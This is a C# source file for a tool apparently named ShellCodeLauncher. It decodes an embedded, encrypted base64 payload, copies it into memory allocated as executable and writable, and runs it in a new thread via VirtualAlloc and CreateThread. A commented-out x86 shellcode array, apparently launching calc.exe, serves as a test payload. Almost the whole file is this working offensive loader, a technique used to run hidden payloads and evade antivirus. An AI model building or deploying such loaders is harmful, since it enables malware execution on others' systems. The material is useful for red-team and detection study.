using System;

using System.IO;
using System.IO.Compression;
using CommandLine;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static ShellCodeLauncher.decode;
using System.Runtime.InteropServices;
using static ShellCodeLauncher.operations;



namespace ShellCodeLauncher
{
	class Program
	{


		static void Main(string[] args)
		{
			//todo make an input switch so you dont need to compile it every time you change the payload
			//calc.exe?
			string input = "kR0aXnHgYwGXIOYwGdGyfvqzfLaZ4xqBcPObt6StqL0lp/nUUmG5vPfPaPdkItDQfcEpH5vM/fWJKf3siB84E0h+emp5kkhn6T2s9xxZGbrx5jUlQXtvxoT2wrgsUS/DaLlPC9WjUILPEaOoAc25/TBo5YCaO3NCweypgeorDLsXhwdQc8MsDfr1yVygEZc4VWVgJ4aGJCVYQh7cQ2q8etHzIrFuaYTYZ7TB39tEmOnCa/lk366gqdEJw/nyOpQhAjgTdxSgNVI6dYFKEooptYESXYDGl3Bh3+79eV8Pd2tA3pVuUHoh8J7dqTK779L5XoBWYPb6hiwLKRvbFDf8Id/+3Ytmh5r92wp0uVFrQwKT6iw2TC+/ZwyNd1LDR/KYv3VzMSm9QbXHCkrfGgTNmFsiQGd3w/tOu7YoYVLTNALvwGSTr3B2PIdJ7sWoINaIc6PDFxXLTV3kcc+mKsKNQ+i9cFO/D35n77A6CTRts81vH5YSXbty4BSP5O75zdQHyixfU8zvd52OG4IUuC7cXUN4rCcr+2cHsFoC/Lwd24gDzaVR1Qum6yyonHWbp/i7Cf2tyKtfdgI2DoYHsRVJPl+lFoSu1RZRrCivjINcu0vBChN4ck4Kfo2YOR7pOJbFNNrAVOVM1LR37NhC0wbegKLUBGBEKuppOdm+H5jWrj+tPBTa3A3gHPUSDBBJtOLDHc18HxN2iAmye3sfiUT7d9KtzPo9PDlB4e4c8qxyWHg=";

			//default input as bytes over a string
			/*byte[] sanity = new byte[112] {
                    0x31,0xdb,0x64,0x8b,0x7b,0x30,0x8b,0x7f, 
					0x0c,0x8b,0x7f,0x1c,0x8b,0x47,0x08,0x8b, 
					0x77,0x20,0x8b,0x3f,0x80,0x7e,0x0c,0x33, 
					0x75,0xf2,0x89,0xc7,0x03,0x78,0x3c,0x8b, 
					0x57,0x78,0x01,0xc2,0x8b,0x7a,0x20,0x01, 
					0xc7,0x89,0xdd,0x8b,0x34,0xaf,0x01,0xc6, 
					0x45,0x81,0x3e,0x43,0x72,0x65,0x61,0x75, 
					0xf2,0x81,0x7e,0x08,0x6f,0x63,0x65,0x73, 
					0x75,0xe9,0x8b,0x7a,0x24,0x01,0xc7,0x66, 
					0x8b,0x2c,0x6f,0x8b,0x7a,0x1c,0x01,0xc7, 
					0x8b,0x7c,0xaf,0xfc,0x01,0xc7,0x89,0xd9, 
					0xb1,0xff,0x53,0xe2,0xfd,0x68,0x63,0x61, 
					0x6c,0x63,0x89,0xe2,0x52,0x52,0x53,0x53, 
					0x53,0x53,0x53,0x53,0x52,0x53,0xff,0xd7};
					
			*/
			// Array of bytes containing the unpacked version of the exe



			byte[] shellcode = Create_shellcode(args, input);
			//Console.WriteLine(sanity);
			//Console.WriteLine(sanity.Length);
			try
			{

				UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
								MEM_COMMIT, PAGE_EXECUTE_READWRITE);
				Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
				IntPtr hThread = IntPtr.Zero;
				UInt32 threadId = 0;
				// prepare data


				IntPtr pinfo = IntPtr.Zero;

				// execute native code

				hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
				WaitForSingleObject(hThread, 0xFFFFFFFF);
				return;



			}
			catch (Exception ex)
			{
				Console.WriteLine("TEST");
				while (ex != null)
				{
					Console.WriteLine(ex.Message);
					ex = ex.InnerException;
				}
			}


		}


		private static UInt32 MEM_COMMIT = 0x1000;

		private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

		[DllImport("kernel32")]
		private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
			 UInt32 size, UInt32 flAllocationType, UInt32 flProtect);


		[DllImport("kernel32")]
		private static extern IntPtr CreateThread(

		  UInt32 lpThreadAttributes,
		  UInt32 dwStackSize,
		  UInt32 lpStartAddress,
		  IntPtr param,
		  UInt32 dwCreationFlags,
		  ref UInt32 lpThreadId

		  );

		[DllImport("kernel32")]
		private static extern UInt32 WaitForSingleObject(

		  IntPtr hHandle,
		  UInt32 dwMilliseconds
		  );
	}
}